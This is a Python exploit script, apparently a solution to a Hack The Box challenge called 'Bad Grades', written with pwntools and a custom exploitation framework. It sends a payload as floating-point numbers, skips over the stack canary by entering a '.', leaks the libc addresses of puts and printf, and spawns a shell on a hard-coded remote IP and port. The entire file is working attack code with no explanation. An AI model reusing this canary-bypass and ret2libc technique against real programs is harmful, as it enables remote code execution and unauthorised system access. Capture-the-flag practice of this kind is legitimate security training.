import ipaddress
import pathlib
import struct

from pwnlib.tubes.process import process

from abstract.pwntarget import PwnTarget
from core.gdb_wrapper import GdbWrapper
from core.target_config import Config, Mode
from core.targetbase import TargetBase
from modules.get_libc_address import GetLibcAddress
from modules.exec_shell import ExecShell


class BadGradesPwn(PwnTarget):
    @classmethod
    def main(cls, proc: process, payload: bytes, pwn_target, *args, **kwargs):
        print(proc.clean(timeout=0.1).decode())

        canary_pos = (pwn_target.offset - 8) // 8
        proc.sendline(b'2')
        print(proc.clean(timeout=0.1).decode())
        proc.sendline(str(len(payload) // 8).encode())

        for i in range(len(payload)//8):
            if i == canary_pos:
                value = '.'
            else:
                value = struct.unpack('d', payload[i*8:(i+1)*8])[0]
                assert struct.pack('d', value) == payload[i*8:(i+1)*8]

            print(proc.clean(timeout=0.1).decode(), value)
            proc.sendline(str(value).encode())

    @classmethod
    def input_handler(cls, proc: process, payload: bytes, *args, **kwargs):
        proc.recvline()


if __name__ == '__main__':
    config = Config(
        rop=True,
        mode=Mode.remote,
        ip=ipaddress.IPv4Address("167.71.137.186"),
        port=32449,
        file=pathlib.Path('/home/lim8en1/htb/projects-archive/bad_grades/bad_grades'),
        offset=0x110,
        detect_libc=True,
        main_function_address=0x1108,
    )
    t = TargetBase(pwn_target=BadGradesPwn, config=config)
    t.canary = 0
    puts_address = GetLibcAddress.execute(t, target_functions=['puts'])
    printf_address = GetLibcAddress.execute(t, target_functions=['printf'])
    GetLibcAddress.libc_update_base_address(t, [('puts', puts_address), ('printf', printf_address)])
    ExecShell.execute(t)
